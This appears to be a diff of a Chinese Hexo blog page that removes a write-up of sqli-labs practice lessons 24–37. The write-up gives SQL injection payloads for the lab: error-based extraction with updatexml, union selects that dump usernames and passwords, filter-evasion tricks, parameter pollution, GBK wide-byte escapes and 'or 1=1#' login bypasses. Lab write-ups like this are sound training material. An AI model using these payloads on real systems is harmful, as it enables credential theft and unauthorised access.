-<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，逻辑是这样的：提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p>
-<p>忘记密码：左下角的忘记密码选项提示：如果你忘记密码 请 hack it<br>新建用户：右下角新建用户可以新建一个自己的用户</p>
-<p>进行登录后修改密码</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207112655750.png" alt="image-20220207112655750"></p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207113315330.png" alt="image-20220207113315330"></p>
-<p>再次用admin账号登录时，使用修改过的密码即可以登录，这两个账号的密码一样</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207113421229.png" alt="image-20220207113421229"></p>
-<h3 id="less-25"><a href="#less-25" class="headerlink" title="less 25"></a>less 25</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084551067.png" alt="image-20220319084551067"></p>
-<p>id 直接单引号拼接，但是被如下函数过滤了</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084705752.png" alt="image-20220319084705752"></p>
-<p>过滤了 or 和 and 关键词，简单绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’||extractvalue(1,concat(0x7e,database()))–+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084817977.png" alt="image-20220319084817977"></p>
-<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p><code>id=$id</code>，与 Less-25 相比，只是拼接方式改变，但因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+			#联合查询时，注意把前面的数据置否</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users) -–+</span><br></pre></td></tr></table></figure>
-
-<p>password写成了passwoorrd，SEPARATOR写成SEPARATOORR<br><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085054071.png" alt="image-20220319085054071"></p>
-<p>password写成了passwoorrd，SEPARATOR写成SEPARATOORR</p>
-<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less 26"></a>Less 26</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085351658.png" alt="image-20220319085351658"></p>
-<p>id&#x3D;’$id’</p>
-<p>过滤了or 和 and 大小写，过滤了 &#x2F;、 *、 –、 #、 空格、 斜线</p>
-<p>?id&#x3D;1’发现存在报错注入</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085851955.png" alt="image-20220319085851955"></p>
-<p>?id&#x3D;”闭合了</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085938644.png" alt="image-20220319085938644"></p>
-<p>?id&#x3D;’||’</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090017928.png" alt="image-20220319090017928"></p>
-<p>直接使用报错注入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less 26a"></a>Less 26a</h3><blockquote>
-<p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;(‘$id’) LIMIT 0,1”;</p>
-</blockquote>
-<p>拼接方式改变</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)||(&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>页面回显正常</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100’%0Bunion%0Bselect%0B1,2,3%0Baandnd%0B’1’=&#x27;1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less 27"></a>Less 27</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090517379.png" alt="image-20220319090517379"></p>
-<p>直接使用报错输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090635726.png" alt="image-20220319090635726"></p>
-<p>字过滤，空格</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’%0Bununionion%0BseLect%0B1,2,3%0Band%0B’1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090755421.png" alt="image-20220319090755421"></p>
-<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less 28"></a>Less 28</h3><p>id&#x3D;(‘$id’)</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319091147465.png" alt="image-20220319091147465"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)  %0a order  %0a  by %0a  3 ;%00 </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319092745410.png" alt="image-20220319092745410"></p>
-<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less 29"></a>Less 29</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319093507400.png" alt="image-20220319093507400"></p>
-<p>查看<strong>login.php</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># 查询 query 的字符串</span><br><span class="line">$qs = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"># 模拟 tomcat 的查询函数 处理一下</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line"></span><br><span class="line"># 再次过滤检测</span><br><span class="line">whitelist($id1);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">if 查询到结果:</span><br><span class="line">    输出查询的详细信息</span><br><span class="line">else:</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    # &amp; 作为分隔符 分割字符串</span><br><span class="line">    $qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line">    # 遍历 qs_array 数组</span><br><span class="line">    foreach($qs_array as $key =&gt; $value)</span><br><span class="line">    &#123;    </span><br><span class="line">        $val=substr($value,0,2);</span><br><span class="line">        # 如果数组前两位是 id 的话</span><br><span class="line">        if($val==&quot;id&quot;)</span><br><span class="line">        &#123;    </span><br><span class="line">            # 截取 $value 的3-30 的字符串 作为 id 的值 </span><br><span class="line">            $id_value=substr($value,3,30); </span><br><span class="line">            return $id_value;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">    # 过滤规则 检测数字</span><br><span class="line">    $match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">    if 不符合规则：</span><br><span class="line">        header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">可以发现，问题出现在：</span><br><span class="line"></span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">...</span><br><span class="line">whitelist($id1);</span><br><span class="line">whitelist过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 &#x27;hacked.php&#x27;，这里是没毛病的。那么问题出在了这里函数&#x27;$id1=java_implimentation($qs)&#x27;;</span><br><span class="line"></span><br><span class="line">因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 return $id_value，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</span><br><span class="line"></span><br><span class="line">假设用户输入这样的语句：</span><br><span class="line">index.php?id=1&amp;id=2</span><br><span class="line">Apache PHP 会解析最后一个参数</span><br><span class="line">Tomcat JSP 会解析第一个参数</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less 30"></a>Less 30</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319093945598-1653725870448.png" alt="image-20220319093945598"></p>
-<p>和less29没什么本质变化，只是拼接方式不一样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094255229.png" alt="image-20220319094255229"></p>
-<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less 31"></a>Less 31</h3><p><code>id=（&quot;$id&quot;）</code></p>
-<p>直接构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094421820.png" alt="image-20220319094421820"></p>
-<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less 32"></a>Less 32</h3><p>构造?id&#x3D;1，发现回显正常</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220130200518028.png" alt="image-20220130200518028"></p>
-<p>构造?id&#x3D;1’</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220130201230423.png" alt="image-20220130201230423"></p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094950654.png" alt="image-20220319094950654"></p>
-<p>这里输入的’直接被转义成\了，一般情况下，是不存在SQL注入的，不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式时在地址后先加一个%df，再加一个单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5是繁体字“連”，所以这时，单引号成功逃逸，报出MySQL的数据库错误</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131102727746.png" alt="image-20220131102727746"></p>
-<p>根据错误判断闭合方式为’-+，并且为字符型注入，确定回显位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; order by 1(/2/3/4)--+</span><br></pre></td></tr></table></figure>
-
-<p>这里括号里是或，从1~4,最终到4时回显Unknown column ‘4’ in ‘order clasue’，说明爆出的字段数为3</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103344678.png" alt="image-20220131103344678"></p>
-<p>查看当前库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103704301.png" alt="image-20220131103704301"></p>
-<p>查看security库下的所有表</p>
-<p>由于单引号被转义了，所以不能输入<code>tabel_schema=&#39;security&#39;</code>，这里输入为<code>table_schema=database()</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103939361.png" alt="image-20220131103939361"></p>
-<p>查看users表下的所有字段，这里的单引号也被转义，所以将users转化为16进制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131104142610.png" alt="image-20220131104142610"></p>
-<p>查看usename,password字段下的所有值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,password) from security.users)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131104542234.png" alt="image-20220131104542234"></p>
-<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less 33"></a>Less 33</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095049478.png" alt="image-20220319095049478"></p>
-<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。<br> 使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095340334.png" alt="image-20220319095340334"></p>
-<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less 34"></a>Less 34</h3><p>过滤方法和less33一致，只是由GET 型变成了POST型</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095538195.png" alt="image-20220319095538195"></p>
-<p>我们用万能密码的方式的来突破这一关：</p>
-<p>username：�’ or 1&#x3D;1#<br> Password：随便填</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100052436.png" alt="image-20220319100052436"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原始的 sql 语句为</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">此时 sql 语句为</span><br><span class="line">SELECT username, password FROM users WHERE username=&#x27;� &#x27; or 1=1#&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
-
-<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less 35"></a>Less 35</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100513064.png" alt="image-20220319100513064"></p>
-<p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：<br> ?id&#x3D;1 and updatexml(1,concat(0x7e,(select version())),1)</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100608266.png" alt="image-20220319100608266"></p>
-<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less 36"></a>Less 36</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df’ and updatexml(1,concat(0x7e,(select version())),1) --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100911685.png" alt="image-20220319100911685"></p>
-<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less 37"></a>Less 37</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319101243994.png" alt="image-20220319101243994"></p>
-<p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 mysql_real_escape_string()函数，而不是 addslashes()函数，但是原理是一致的。</p>
-<p>我们直接使用之前所用过的万能密码来突破一下：</p>
-<p>username：�’ or 1&#x3D;1#</p>
-<p>password：任意</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319101400429.png" alt="image-20220319101400429"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
     <article id="post-sqli-labs刷题记录page-3" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1634,26 +1634,5 @@
 <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
   </div>
-<!-- hexo injector body_end start -->
-  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js"></script>
-  <script data-pjax>
-        function GithubCalendarConfig(){
-            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?qhkk";
-            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
-            var git_user ="qhkk";
-            var parent_div_git = document.getElementById('recent-posts');
-            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
-            if(parent_div_git && location.pathname =='/'){
-                console.log('已挂载github calendar')
-                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
-                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
-            };
-            GithubCalendar(git_githubapiurl,git_color,git_user)
-        }
-        if(document.getElementById('recent-posts')){
-            GithubCalendarConfig()
-        }
-    </script>
-    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
-    <style>undefined</style><!-- hexo injector body_end end --></body>
+</body>
 </html>
